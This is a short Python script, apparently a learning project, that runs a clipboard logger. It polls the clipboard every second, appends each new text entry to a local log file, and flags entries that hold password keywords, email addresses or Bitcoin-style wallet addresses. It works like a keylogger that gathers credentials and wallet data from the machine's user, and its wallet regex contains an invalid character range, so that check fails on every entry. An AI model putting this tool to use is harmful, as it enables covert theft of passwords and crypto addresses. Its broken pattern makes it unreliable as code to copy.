import pyperclip
import time
import re

def is_sensitve(text):
    email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    wallet_pattern = r"\b[13][a-km-za-HJ-NP-Z1-9]{25,34}\b"
    password_keywords = ["password", "pass", 'pwd']

    if not isinstance(text, str):
        return False

    if any(keyword in text.lower()
           for keyword in password_keywords):
        return True
    if re.search(email_pattern, text):
        return True
    if re.search(wallet_pattern, text):
        return True
    return False

def save(logs):
    with open("clipboard_logger.txt", "a") as file:
        first = "New data from clipboard logger: "
        clip = f"{first}: {time.ctime()} - {logs}\n"
        final = file.write(clip)
    return final

old_clipboard = ""

print("Clipboard logger is running...\n")

while True:
    try:
        clipboard_content = pyperclip.paste()

        if not isinstance(clipboard_content, str):
            print("[!] Clipboard contains non-text data, skiping.....")
            time.sleep(1)
            continue
        if clipboard_content != old_clipboard:
            save(clipboard_content)
            print(f"New clipboard content: {clipboard_content}")
            old_clipboard = clipboard_content
            if is_sensitve(clipboard_content):
                print(">> [!] Possible sensitive data detected!\n")

        time.sleep(1)

    except Exception as e:
        print(f"[ERROR] Something went wrong: {e}")
        time.sleep(1)